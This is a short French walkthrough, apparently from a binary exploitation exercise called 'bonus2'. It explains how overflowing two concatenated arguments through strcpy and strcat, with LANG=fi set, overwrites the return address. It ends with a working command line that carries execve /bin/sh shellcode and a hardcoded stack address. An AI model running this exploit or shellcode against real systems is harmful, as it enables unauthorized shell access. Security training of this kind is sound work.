# bonus2

On remarque qu'il n'y a qu'un seul gros buffer lors du `strcpy` des arguments. \
Il prend les 40 chars de `argv[1]` et 32 chars de `argv[2]` \
En faisant un `argv[1]` plus long que 40 chars, on overwrite le `\0` et donc on fait concatener nos deux arguments. \
Grâce à la concat des args, cela fait donne un gros payload au `strcat` du `greetuser`, \
En mettant `LANG=fi` (greeting + long), le segfault tombe sur notre payload \
On peut maintenant écrire sur la stack avec un offset de 18 avec `argv[2]`. \
(Offset trouvé par un Buffer overflow pattern generator encore et toujours) \
À la fin de notre payload, on lui dit de ret sur le début de notre payload, et au début on y met du shellcode, on complète avec des dummy caratères:

```bash
LANG="fi" ./bonus2 "$(python -c 'print "\x90"*8 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"A"*8')" "$(python -c 'print "B"*18 + "\x40\xf6\xff\xbf"')"
```
